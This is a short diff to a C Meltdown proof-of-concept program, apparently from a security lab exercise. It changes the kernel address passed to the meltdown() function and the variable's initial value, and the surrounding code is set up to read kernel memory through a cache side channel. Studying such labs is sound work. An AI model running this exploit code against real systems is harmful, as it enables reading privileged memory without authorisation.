@@ -46,7 +46,7 @@ void reloadSideChannel()
 
 void meltdown(unsigned long kernel_data_addr)
 {
-  char kernel_data = 0x49f9dadb;
+  char kernel_data = 0;
    
   // The following statement will cause an exception
   kernel_data = *(char*)kernel_data_addr;     
@@ -89,7 +89,7 @@ int main()
   flushSideChannel();
     
   if (sigsetjmp(jbuf, 1) == 0) {
-     meltdown(0xfb61b000);                
+     meltdown(0x49f9dadb);                
   }
   else {
       printf("Memory access violation!\n");
